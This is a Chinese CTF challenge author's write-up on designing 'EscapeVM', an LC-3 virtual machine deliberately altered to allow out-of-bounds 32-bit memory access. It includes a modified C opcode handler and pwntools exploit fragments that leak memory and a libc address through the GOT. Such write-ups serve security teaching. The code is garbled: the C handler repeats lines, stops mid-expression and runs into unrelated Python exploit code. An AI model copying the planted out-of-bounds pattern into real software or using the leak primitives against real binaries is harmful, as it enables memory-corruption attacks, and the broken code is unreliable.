这是我们队伍第一次打进全国大学生信息安全竞赛（国赛）的决赛，每个队伍要求出一道题目作为Build
it环节的提交。由于这次没有把解出题目的队伍数目纳入评分标准，于是决定放开手脚搞搞新意思，用两天多点的时间出了这题。决赛的时候我们自然不会抽到自己的题目。只是看到单刷的pizza大佬凭借一题Pwn2在第一天排到第二名，心中有种预感，这Pwn2不会就是我出的这题吧？果然，赛后交流发现全场只有pizza能解的正是这题EscapeVM，心中忍不住喊一声pizza
tql，下面记录一下这题的出题思路。
出题的思路源于某天刷玄武推送时候看到的一篇博客：[LC-3](https://justinmeiners.github.io/lc3-vm/),
作者用较少的代码量简单实现了一个[LC-3](https://en.wikipedia.org/wiki/LC-3)架构的虚拟机。堆题目做的太多了没啥意思，这次就跟上国际赛的热点，出一道虚拟机逃逸的题目。第一次看到类似的题目是在`SECCON2017`里面的[500_vm_no_fun](https://github.com/SECCON/SECCON2017_online_CTF/tree/master/pwn/500_vm_no_fun)，这种题目的思路基本都是通过修改原来指令集，引入越界读写漏洞，然后通过任意地址读写的能力来控制EIP，最后达成get
shell的目的。
## 漏洞
参考LC-3的[汇编文档](http://people.cs.georgetown.edu/~squier/Teaching/HardwareFundamentals/LC3-trunk/docs/LC3-AssemblyManualAndExamples.pdf)和虚拟机实现代码，列举出可以用于读写内存的指令。发现其中提供多条指令来完成读写内存，包括有`OP_LD`，`OP_ST`，`OP_LDR`，`OP_STR`，`OP_LDI`，`OP_STI`。由于LC-3是16位架构的机器，而这次编译出来的binary目标架构是32位的，若想要让攻击者获得32位地址的任意读写能力来完成虚拟机逃逸的任务，可以通过两个16位寄存器来拼凑出32位地址的方法来赋予越界读写的能力。于是对原来的虚拟机程序进行了以下修改：
    case OP_LDR:
                        /* LDR */
                        {
                            uint16_t r0 = (instr >> 9) & 0x7;
                            uint16_t r1 = (instr >> 6) & 0x7;
                            uint16_t r2 = (instr >> 3) & 0x7;
                            int32_t addr = (reg[r1] > 9) & 0x7;
                            uint16_t r1 = (instr >> 6) & 0x7;
                            uint16_t r2 = (instr >> 3) & 0x7;
                            uint16_t offset = sign_extend(instr & 0x3F, 6);
                            int32_t addr = (reg[r1] > 16)
            code += p16(addr & 0xFFFF)
            code += p16(value >> 16)
            code += p16(value & 0xFFFF)
            return code
    def read_primitive(addr):
        with context.local(endian='big'):
            code = p16(0x3000)
            code += p16(0x2407) # LD R2, X
            code += p16(0x2207) # LD R1, Y
            code += p16(0x608a) # LDR R0, R2, #10
            code += p16(0xF021) # OUT
            code += p16(0x1261) # ADD R1, R1, #1
            code += p16(0x608A) # LDR R0, R2, #10
            code += p16(0xF021) # OUT
            code += p16(0xF025) # HALT
            code += p16(addr >> 16)
            code += p16(addr & 0xFFFF)
        return code
    def leak_memory():
        with context.local(endian='big'):
            code = p16(0x3000)
            code += p16(0x11e0) # ADD R0, R7, #0
            code += p16(0xf021) # OUT
            code += p16(0x5020) # AND R0, R0, #0
            code += p16(0x11a0) # ADD R0, R6, #0
            code += p16(0xf021) # OUT
            code += p16(0xf025) # HALT
        return code
    def do_exit():
        with context.local(endian='big'):
            code = p16(0x3000)
            code += p16(0xf026) # EXIT
        return code
    image = leak_memory()
    p.sendafter("Input: ", image)
    content = ru("HALT")
    memory = u32(content)
    info_addr("memory", memory)
    image1 = read_primitive(calculate_off(elf.got['printf']))
    p.sendafter("Input: ", image1)
    content = ru("HALT")
    leak_libc = u32(content)
    info_addr("leak_libc", leak_libc)